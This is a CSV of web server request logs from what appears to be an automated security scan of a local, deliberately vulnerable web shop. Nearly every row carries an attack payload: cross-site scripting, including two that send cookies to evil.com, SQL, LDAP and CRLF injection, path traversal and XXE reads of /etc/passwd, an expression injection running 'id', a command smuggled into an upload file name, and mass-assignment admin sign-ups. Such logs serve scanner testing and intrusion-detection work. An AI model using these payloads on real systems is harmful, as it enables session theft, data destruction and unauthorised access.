_id,signature,body_bytes,ip,request.method,request.path,request.protocol,request_body,status,timestamp
47d9cc443dd3f93d663a8812,8e25c7d877be893e,31,127.0.0.1,PUT,/api/Addresss/53,HTTP/1.1,"{\x22city\x22: \x22<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>\x22, \x22streetAddress\x22: \x22<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>\x22}",401,2025-12-02T23:41:05+0530
2a39cdd132cf80ed97582f6b,6374e4221a459d48,341,127.0.0.1,DELETE,/api/Products/expect%3A//id,HTTP/1.1,,500,2025-12-02T23:41:06+0530
90dac987683427221443eab1,8fb1208454dd5605,30,127.0.0.1,GET,/rest/products/search?q=value%0D%0AX-Injected%3A%20header,HTTP/1.1,,200,2025-12-02T23:41:07+0530
bd18898e5e32d433822e4154,0a03c19f3929936e,293,127.0.0.1,POST,/api/Users,HTTP/1.1,"{\x22__proto__\x22: {\x22isAdmin\x22: true}, \x22constructor\x22: {\x22prototype\x22: {\x22isAdmin\x22: true}}}",201,2025-12-02T23:41:09+0530
02c1880de4657781a4c66883,5cf4c280d3fe0cba,245,127.0.0.1,PUT,/api/BasketItems/849,HTTP/1.1,{\x22quantity\x22: 0},401,2025-12-02T23:41:11+0530
489a863b6a573ebefd1de2e0,fd67f1949606304f,245,127.0.0.1,DELETE,/api/BasketItems/1%20OR%201%3D1,HTTP/1.1,,401,2025-12-02T23:41:13+0530
03ede24a7e6d8acf0c97b6cb,0d392679e36d64f2,2992,127.0.0.1,GET,/rest/products/search?q=juice&order=name%3B%20DROP%20TABLE%20users%3B--,HTTP/1.1,,200,2025-12-02T23:41:14+0530
d07a1ffdcc31c549794b2581,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWGez9&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:41:14+0530
af9048778d5fdf24e0b4bc65,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWGl1B&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:41:14+0530
79b26a4f389a32c5f1df3877,5a9b9819458d22ab,42,127.0.0.1,POST,/api/Feedbacks,HTTP/1.1,"{\x22comment\x22: \x22<%= 7*7 %>\x22, \x22rating\x22: 5, \x22captcha\x22: \x221\x22, \x22captchaId\x22: 1}",401,2025-12-02T23:41:15+0530
711284528a0d10c82264552e,e70c3b4340d087ad,9015,127.0.0.1,PUT,/etc/passwd%2500,HTTP/1.1,{\x22name\x22: \x22hacked\x22},200,2025-12-02T23:41:16+0530
b5477e93996f3089e2525844,eeaae0a7260adcd2,245,127.0.0.1,DELETE,/api/BasketItems/1%3B%20DROP%20TABLE%20users%3B--,HTTP/1.1,,401,2025-12-02T23:41:17+0530
8b7487a0fdd1ead332459355,d019c048264c6a70,30,127.0.0.1,GET,/rest/products/search?q=admin%29%28%7C%28password%3D%2A%29%29,HTTP/1.1,,200,2025-12-02T23:41:19+0530
60def1f7e1c5a0a86d4bea04,0a03c19f3929936e,293,127.0.0.1,POST,/api/Users,HTTP/1.1,"{\x22__proto__\x22: {\x22isAdmin\x22: true}, \x22constructor\x22: {\x22prototype\x22: {\x22isAdmin\x22: true}}}",201,2025-12-02T23:41:21+0530
571c589bb5a0021fd043d30b,8e25c7d877be893e,31,127.0.0.1,PUT,/api/Addresss/75,HTTP/1.1,"{\x22city\x22: \x22%3Cscript%3Ealert('XSS')%3C/script%3E\x22, \x22streetAddress\x22: \x22%3Cscript%3Ealert('XSS')%3C/script%3E\x22}",401,2025-12-02T23:41:22+0530
5487eff0655172dbeb098a53,fd67f1949606304f,245,127.0.0.1,DELETE,/api/BasketItems/1%20OR%201%3D1,HTTP/1.1,,401,2025-12-02T23:41:24+0530
138c8de60147139cfcb8d3a2,d019c048264c6a70,30,127.0.0.1,GET,/rest/products/search?q=admin%29%28%7C%28password%3D%2A%29%29,HTTP/1.1,,200,2025-12-02T23:41:25+0530
7aa68d64b5b311d919c5358b,5a9b9819458d22ab,42,127.0.0.1,POST,/api/Feedbacks,HTTP/1.1,"{\x22comment\x22: \x22' UNION SELECT NULL, NULL, NULL--\x22, \x22rating\x22: 5, \x22captcha\x22: \x221\x22, \x22captchaId\x22: 1}",401,2025-12-02T23:41:26+0530
4a518a3b1462c02ab6f6976e,8e25c7d877be893e,31,127.0.0.1,PUT,/api/Addresss/95,HTTP/1.1,"{\x22city\x22: \x22<iframe src=javascript:alert('XSS')>\x22, \x22streetAddress\x22: \x22<iframe src=javascript:alert('XSS')>\x22}",401,2025-12-02T23:41:27+0530
25de03f0aaee9642f79b9801,84e6c983495330a9,245,127.0.0.1,DELETE,/api/Products/1,HTTP/1.1,,401,2025-12-02T23:41:28+0530
7401342add10305c458d277e,6dfb50b9b96f7679,2992,127.0.0.1,GET,/rest/products/search?q=juice&order=1%2C2%2C3%2C4%2C5--,HTTP/1.1,,200,2025-12-02T23:41:28+0530
e6b381cd57b50e124f3ede44,5a20be4ce1a94dc4,31,127.0.0.1,POST,/api/Addresss,HTTP/1.1,"{\x22fullName\x22: \x22&#60;script&#62;alert('XSS')&#60;/script&#62;\x22, \x22mobileNum\x22: \x221234567890\x22, \x22zipCode\x22: \x2212345\x22, \x22streetAddress\x22: \x22&#60;script&#62;alert('XSS')&#60;/script&#62;\x22, \x22city\x22: \x22&#60;script&#62;alert('XSS')&#60;/script&#62;\x22, \x22state\x22: \x22XS\x22, \x22country\x22: \x22&#60;script&#62;alert('XSS')&#60;/script&#62;\x22}",401,2025-12-02T23:41:30+0530
8e8409f6d63f5342f4ed729a,8e25c7d877be893e,31,127.0.0.1,PUT,/api/Addresss/63,HTTP/1.1,"{\x22city\x22: \x22<div onmouseover=alert('XSS')>hover me</div>\x22, \x22streetAddress\x22: \x22<div onmouseover=alert('XSS')>hover me</div>\x22}",401,2025-12-02T23:41:32+0530
afa06ebfb56cd84ab710fa09,84e6c983495330a9,245,127.0.0.1,DELETE,/api/Products/1,HTTP/1.1,,401,2025-12-02T23:41:34+0530
173af19f3318afddc31dc630,0d392679e36d64f2,2992,127.0.0.1,GET,/rest/products/search?q=juice&order=name%3B%20DROP%20TABLE%20users%3B--,HTTP/1.1,,200,2025-12-02T23:41:37+0530
ef965e2e5378e5d6822d7f22,55af35de850dcbd1,343,127.0.0.1,POST,/rest/user/change-password,HTTP/1.1,"{\x22current\x22: \x22oldpassword\x22, \x22new\x22: \x22hacked123\x22, \x22repeat\x22: \x22hacked123\x22}",500,2025-12-02T23:41:38+0530
74ac72748ee083ffee6054ff,5cf4c280d3fe0cba,245,127.0.0.1,PUT,/api/BasketItems/83,HTTP/1.1,{\x22quantity\x22: \x22admin'--\x22},401,2025-12-02T23:41:39+0530
35e3ff00cbd656f33b458460,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWGl1H&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:41:39+0530
6b007eeb2d6baabc69e466a2,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWGr7f&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:41:39+0530
b2c93e13b6c70dfbb48b964e,aa911f36222579a4,245,127.0.0.1,DELETE,/api/Users/919,HTTP/1.1,,401,2025-12-02T23:41:40+0530
490b8b8b5cab5c81caaf1b7c,a38db79d01ac3b4f,30,127.0.0.1,GET,/rest/products/search?q=value%0D%0A%0D%0A%3Chtml%3Einjected%3C/html%3E,HTTP/1.1,,200,2025-12-02T23:41:42+0530
42121e9fe19e2b960d7a40b6,5a9b9819458d22ab,42,127.0.0.1,POST,/api/Feedbacks,HTTP/1.1,"{\x22comment\x22: \x22<audio src=x onerror=alert('XSS')>\x22, \x22rating\x22: 5, \x22captcha\x22: \x221\x22, \x22captchaId\x22: 1}",401,2025-12-02T23:41:44+0530
b0fd4ac508b1eb3ad2507661,19d865dad9949bdc,157,127.0.0.1,PUT,/api/Products/..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,HTTP/1.1,,400,2025-12-02T23:41:45+0530
5ada0c8b83f3a82f1d12545f,aa911f36222579a4,245,127.0.0.1,DELETE,/api/Users/420,HTTP/1.1,,401,2025-12-02T23:41:48+0530
1ccf1b93fb1c4b9cb97f68dd,296b3a1de93bdfad,30,127.0.0.1,GET,/rest/products/search?q=%2A%29%28uid%3D%2A%29%29%28%7C%28uid%3D%2A,HTTP/1.1,,200,2025-12-02T23:41:50+0530
332feb01bd137d9f12aae8e3,5a9b9819458d22ab,42,127.0.0.1,POST,/api/Feedbacks,HTTP/1.1,"{\x22comment\x22: \x22<<script>alert('XSS');//<</script>\x22, \x22rating\x22: 5, \x22captcha\x22: \x221\x22, \x22captchaId\x22: 1}",401,2025-12-02T23:41:51+0530
d99b68d51829de98c1bf7612,5cf4c280d3fe0cba,245,127.0.0.1,PUT,/api/BasketItems/57,HTTP/1.1,{\x22quantity\x22: \x221' AND SLEEP(5) AND '1'='1\x22},401,2025-12-02T23:41:53+0530
832ff6e45f6efa354d8bf20d,f4bf5052de3f3a3b,31,127.0.0.1,DELETE,/api/Cards/997,HTTP/1.1,,401,2025-12-02T23:41:54+0530
621458e78a056fdb46a9bf65,51b50c6144058eec,30,127.0.0.1,GET,/rest/products/search?q=value%0ASet-Cookie%3A%20malicious%3Dcookie,HTTP/1.1,,200,2025-12-02T23:41:55+0530
7da60912bb83f56048a91d81,0a03c19f3929936e,293,127.0.0.1,POST,/api/Users,HTTP/1.1,"{\x22__proto__\x22: {\x22isAdmin\x22: true}, \x22constructor\x22: {\x22prototype\x22: {\x22isAdmin\x22: true}}}",201,2025-12-02T23:41:57+0530
1203154e1eae785a7090ab1c,5cf4c280d3fe0cba,245,127.0.0.1,PUT,/api/BasketItems/17,HTTP/1.1,{\x22quantity\x22: \x22admin'-- \x22},401,2025-12-02T23:41:57+0530
2deb7b37951a1c611c46e7c3,aa911f36222579a4,245,127.0.0.1,DELETE,/api/Users/1,HTTP/1.1,,401,2025-12-02T23:41:59+0530
adf092ddfb6369c5594d816f,1d8c3cc2b722f935,8656,127.0.0.1,GET,/api/Challenges,HTTP/1.1,,200,2025-12-02T23:42:00+0530
c969b9da466813b76e33a2ab,f8c6500be76cdb86,245,127.0.0.1,POST,/api/Complaints,HTTP/1.1,"{\x22message\x22: \x22data:text/html,<script>alert('XSS')</script>\x22}",401,2025-12-02T23:42:01+0530
29be4a1d90de0d237b3ebd09,5cf4c280d3fe0cba,245,127.0.0.1,PUT,/api/BasketItems/276,HTTP/1.1,{\x22quantity\x22: 0},401,2025-12-02T23:42:03+0530
dbd454d89ecc40d644111af6,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWGr7h&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:42:04+0530
11d0b787c54b82271157333e,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWGxDu&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:42:04+0530
a51602edfbe3474b80fe041d,b5942554828baf1f,245,127.0.0.1,DELETE,/api/Challenges/1,HTTP/1.1,,401,2025-12-02T23:42:05+0530
5838c5c3dc2031df985b33be,889753a312887039,30,127.0.0.1,GET,/api/Recycles/338,HTTP/1.1,,200,2025-12-02T23:42:07+0530
46f3ebf309819bd0f704f142,44b4e5901a7362ef,251,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWGxDv&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:42:09+0530
8b18484103ae8b5981b6dc76,0a03c19f3929936e,314,127.0.0.1,POST,/api/Users,HTTP/1.1,"{\x22email\x22: \x22attacker1070@evil.com\x22, \x22password\x22: \x22test1234\x22, \x22passwordRepeat\x22: \x22test1234\x22, \x22role\x22: \x22admin\x22, \x22isAdmin\x22: true, \x22totpSecret\x22: \x22\x22, \x22securityQuestion\x22: {\x22id\x22: 1}, \x22securityAnswer\x22: \x22test\x22}",201,2025-12-02T23:42:09+0530
715fec615ed3e60edcd5ee40,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWGySB&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,"42[\x22notification received\x22,\x22adf858a9828123061257cba29e3f34da87b23962\x22]",200,2025-12-02T23:42:09+0530
5496d0a286e37aedcb6f80ff,6f7d2cdf49b3a2c7,79,127.0.0.1,GET,/rest/continue-code,HTTP/1.1,,200,2025-12-02T23:42:09+0530
6d4cdd4f5741240bf79310b3,5cf4c280d3fe0cba,245,127.0.0.1,PUT,/api/BasketItems/55,HTTP/1.1,{\x22quantity\x22: \x22'; WAITFOR DELAY '0:0:5'--\x22},401,2025-12-02T23:42:10+0530
08e0eaa2cd62ade2a0f7fbf9,5cb54163f1ef710e,359,127.0.0.1,DELETE,/api/Products/..%25255c..%25255c..%25255cwindows/win.ini,HTTP/1.1,,500,2025-12-02T23:42:11+0530
0c1840800bc30103fb62a3cf,0ea299fb9f9b5b97,157,127.0.0.1,GET,/rest/products/download/..%5C..%5C..%5C..%5Cboot.ini,HTTP/1.1,,400,2025-12-02T23:42:12+0530
1835f907f444075bb0cd984c,f8c6500be76cdb86,245,127.0.0.1,POST,/api/Complaints,HTTP/1.1,{\x22message\x22: \x22'\x5C\x22--></style></script><script>alert('XSS')</script>\x22},401,2025-12-02T23:42:16+0530
26cd9984f87c438339c4f41e,b58a2d8f4a8b9853,358,127.0.0.1,PUT,/api/Products/..%25c0%25af..%25c0%25af..%25c0%25afetc/passwd,HTTP/1.1,{\x22name\x22: \x22hacked\x22},500,2025-12-02T23:42:17+0530
fdc0b59adb2376008dd2d67f,f4bf5052de3f3a3b,31,127.0.0.1,DELETE,/api/Cards/227,HTTP/1.1,,401,2025-12-02T23:42:18+0530
89b68a87b3d4d408096e572e,263c872b2a9fd913,157,127.0.0.1,GET,/assets/..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,HTTP/1.1,,400,2025-12-02T23:42:20+0530
df240b3a23ad48a7433aa18e,e59a6dbe6ecf9d1f,245,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 23, \x22BasketId\x22: 99, \x22quantity\x22: 999}",401,2025-12-02T23:42:23+0530
61c388b977a04efefc6e6518,5cf4c280d3fe0cba,245,127.0.0.1,PUT,/api/BasketItems/75,HTTP/1.1,{\x22quantity\x22: \x22{\x5C\x22$gt\x5C\x22: \x5C\x22\x5C\x22}\x22},401,2025-12-02T23:42:25+0530
9bcf06f0f0dcbb66f9ee5ceb,aa911f36222579a4,245,127.0.0.1,DELETE,/api/Users/674,HTTP/1.1,,401,2025-12-02T23:42:26+0530
84b52822aa23ef0148e08e54,d13f7b2873be8870,245,127.0.0.1,GET,/api/Users/15,HTTP/1.1,,401,2025-12-02T23:42:28+0530
3c4d32e2f82fb9de27be25fe,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWGySD&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:42:29+0530
b748aa44d2f01ffdacf81e5c,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWH1Jj&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:42:29+0530
4f292f9934db7d1803a35079,0a03c19f3929936e,308,127.0.0.1,POST,/api/Users,HTTP/1.1,"{\x22email\x22: \x22test8215@test.com\x22, \x22password\x22: \x22test1234\x22, \x22passwordRepeat\x22: \x22test1234\x22, \x22securityQuestion\x22: {\x22id\x22: 1}, \x22securityAnswer\x22: \x22${T(java.lang.Runtime).getRuntime().exec('id')}\x22}",201,2025-12-02T23:42:29+0530
d0cd6998b2473be5b3a73579,171faab99c2caf57,245,127.0.0.1,PUT,/api/Users/36,HTTP/1.1,"{\x22role\x22: \x22admin\x22, \x22isAdmin\x22: true, \x22password\x22: \x22hacked\x22}",401,2025-12-02T23:42:31+0530
027dcc29ca84c62caf91d295,b5942554828baf1f,245,127.0.0.1,DELETE,/api/Challenges/1,HTTP/1.1,,401,2025-12-02T23:42:32+0530
81f7a4c5a0571955687be094,0d392679e36d64f2,2992,127.0.0.1,GET,/rest/products/search?q=juice&order=name%3B%20DROP%20TABLE%20users%3B--,HTTP/1.1,,200,2025-12-02T23:42:33+0530
91b93d448d409f50501f34a1,6f5ba217ef99aef1,0,127.0.0.1,POST,/file-upload,HTTP/1.1,--d976eb6fe02b198814cfae7cf851fd9d\x0D\x0AContent-Disposition: form-data; name=\x22file\x22; filename=\x22test& ls -la.jpg\x22\x0D\x0AContent-Type: image/jpeg\x0D\x0A\x0D\x0Afake image content\x0D\x0A--d976eb6fe02b198814cfae7cf851fd9d--\x0D\x0A,204,2025-12-02T23:42:34+0530
ea169abdf4e01fc073f59ec4,44b4e5901a7362ef,234,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWH1Jn&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:42:34+0530
e8bc491606be43bf8260c6ed,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWH2ei&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,"42[\x22notification received\x22,\x223ca7d41d1c903c5ae68c2f713c9f875db870aca0\x22]",200,2025-12-02T23:42:35+0530
bd1b77e497cebd5c518bf968,6f7d2cdf49b3a2c7,79,127.0.0.1,GET,/rest/continue-code,HTTP/1.1,,200,2025-12-02T23:42:35+0530
60453259350b8949b8786b0d,5cf4c280d3fe0cba,245,127.0.0.1,PUT,/api/BasketItems/427,HTTP/1.1,{\x22quantity\x22: 0},401,2025-12-02T23:42:35+0530
b26aa9f417b4f7a6a02319f0,eeaae0a7260adcd2,245,127.0.0.1,DELETE,/api/BasketItems/1%3B%20DROP%20TABLE%20users%3B--,HTTP/1.1,,401,2025-12-02T23:42:37+0530
7f92c65b3bf2affc09de24a5,392a09f8ef31b5d6,367,127.0.0.1,GET,/rest/products/search?q=%27%20UNION%20SELECT%20NULL--,HTTP/1.1,,500,2025-12-02T23:42:40+0530
d6a876f0ab2670d68e44268e,778309e6a2101665,464,127.0.0.1,POST,/rest/user/login,HTTP/1.1,"{\x22email\x22: \x22admin' #\x22, \x22password\x22: \x22anything\x22}",500,2025-12-02T23:42:42+0530
6e957070b8340c30ac40fa5f,171faab99c2caf57,245,127.0.0.1,PUT,/api/Users/13,HTTP/1.1,"{\x22role\x22: \x22admin\x22, \x22isAdmin\x22: true, \x22password\x22: \x22hacked\x22}",401,2025-12-02T23:42:43+0530
57d4ecc960036b9dff6d5d1c,b5942554828baf1f,245,127.0.0.1,DELETE,/api/Challenges/1,HTTP/1.1,,401,2025-12-02T23:42:44+0530
6ccceba234783bde9e1606d9,a776551050b43969,362,127.0.0.1,GET,/rest/products/download/%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd,HTTP/1.1,,500,2025-12-02T23:42:44+0530
8f5e3141234d24f055095475,0a03c19f3929936e,314,127.0.0.1,POST,/api/Users,HTTP/1.1,"{\x22email\x22: \x22attacker2928@evil.com\x22, \x22password\x22: \x22test1234\x22, \x22passwordRepeat\x22: \x22test1234\x22, \x22role\x22: \x22admin\x22, \x22isAdmin\x22: true, \x22totpSecret\x22: \x22\x22, \x22securityQuestion\x22: {\x22id\x22: 1}, \x22securityAnswer\x22: \x22test\x22}",201,2025-12-02T23:42:46+0530
94268c6eb2a46a998262c841,8f2f26c305a84530,355,127.0.0.1,PUT,/api/Products/..%25252f..%25252f..%25252fetc/passwd,HTTP/1.1,{\x22name\x22: \x22hacked\x22},500,2025-12-02T23:42:47+0530
eb3b599daaef6be6519ed934,e686cc4eff81387d,31,127.0.0.1,DELETE,/api/Addresss/340,HTTP/1.1,,401,2025-12-02T23:42:49+0530
4e8d62090e6e51bcfc77afc1,a495a290c377d9c9,35,127.0.0.1,GET,/api/Products/1%3B%20DROP%20TABLE%20products%3B--,HTTP/1.1,,404,2025-12-02T23:42:51+0530
c457d329f1e24832889f6df3,f8c6500be76cdb86,245,127.0.0.1,POST,/api/Complaints,HTTP/1.1,{\x22message\x22: \x22<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>\x22},401,2025-12-02T23:42:53+0530
20224a7e793c31c978c20458,5cf4c280d3fe0cba,245,127.0.0.1,PUT,/api/BasketItems/449,HTTP/1.1,{\x22quantity\x22: 0},401,2025-12-02T23:42:53+0530
acfbfdd474a858ab0bdba70a,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWH2ej&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:42:54+0530
86428e804d9110aab607a7d3,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWH7QI&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:42:54+0530
4e8b73c3aaa4a9900a7702d5,84e6c983495330a9,245,127.0.0.1,DELETE,/api/Products/329,HTTP/1.1,,401,2025-12-02T23:42:54+0530
e4e9980bc0f6bcf984acaaf4,2d73cc46523f1cc6,337,127.0.0.1,GET,/api/Orders/577,HTTP/1.1,,500,2025-12-02T23:42:56+0530
b9ee420dc385ea184e68f76f,105318df3d48eee2,614,127.0.0.1,POST,/file-upload,HTTP/1.1,--9ed22df03168ced51673c9a53ff30e19\x0D\x0AContent-Disposition: form-data; name=\x22file\x22; filename=\x22malicious.xml\x22\x0D\x0AContent-Type: application/xml\x0D\x0A\x0D\x0A<?xml version=\x221.0\x22?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \x22file:///etc/passwd\x22>]><foo>&xxe;</foo>\x0D\x0A--9ed22df03168ced51673c9a53ff30e19--\x0D\x0A,410,2025-12-02T23:42:57+0530
e69ac06ea60a00f98348b9d9,44b4e5901a7362ef,275,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWH7QL&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:42:57+0530
8550f21a1fdc7a4455e49170,6f7d2cdf49b3a2c7,79,127.0.0.1,GET,/rest/continue-code,HTTP/1.1,,200,2025-12-02T23:42:57+0530
f3206a31ed9fd23bdf8cdc6f,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWH8Dw&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,"42[\x22notification received\x22,\x225fd213c8fc772846b262c307eaaa901340a195bb\x22]",200,2025-12-02T23:42:57+0530
29ffdce3636c8836e8376736,44b4e5901a7362ef,330,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWH8D-&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:42:57+0530
5bb012aeeff28c19832e31c5,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWH8Eo&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,"42[\x22notification received\x22,\x225a196f6f8335ad860de5fd4597a69de8f23dbce8\x22]",200,2025-12-02T23:42:58+0530
dcb911538b963f216b8f3cd0,dad927544b754aad,0,127.0.0.1,GET,/rest/continue-code,HTTP/1.1,,304,2025-12-02T23:42:58+0530
d71bcf899511605264b9a54a,b58a2d8f4a8b9853,358,127.0.0.1,PUT,/api/Products/..%25c0%25af..%25c0%25af..%25c0%25afetc/passwd,HTTP/1.1,{\x22name\x22: \x22hacked\x22},500,2025-12-02T23:42:59+0530
7b2ef3f4c910b156319259aa,84e6c983495330a9,245,127.0.0.1,DELETE,/api/Products/1,HTTP/1.1,,401,2025-12-02T23:43:00+0530
d833b757ae09e347186a10b4,b7393456dcaeb089,381,127.0.0.1,GET,/rest/products/download/php%3A//filter/convert.base64-encode/resource%3Dindex.php,HTTP/1.1,,500,2025-12-02T23:43:01+0530
e41b2764e1cfd01680651672,f8c6500be76cdb86,245,127.0.0.1,POST,/api/Complaints,HTTP/1.1,{\x22message\x22: \x22<audio src=x onerror=alert('XSS')>\x22},401,2025-12-02T23:43:02+0530
99369768282e31b53361e54e,171faab99c2caf57,245,127.0.0.1,PUT,/api/Users/60,HTTP/1.1,"{\x22role\x22: \x22admin\x22, \x22isAdmin\x22: true, \x22password\x22: \x22hacked\x22}",401,2025-12-02T23:43:03+0530
258a365a87cbd5d8475b0a61,b5942554828baf1f,245,127.0.0.1,DELETE,/api/Challenges/1,HTTP/1.1,,401,2025-12-02T23:43:04+0530
b374c355ccf568a540933fad,e09a7283b1b6873d,411,127.0.0.1,GET,/rest/products/search?q=%26%2360%3Bscript%26%2362%3Balert%28%27XSS%27%29%26%2360%3B/script%26%2362%3B,HTTP/1.1,,500,2025-12-02T23:43:06+0530
315edf77bef036ad209903ec,0a03c19f3929936e,304,127.0.0.1,POST,/api/Users,HTTP/1.1,{\x22email\x22: \x22test@test.com\x22},201,2025-12-02T23:43:07+0530
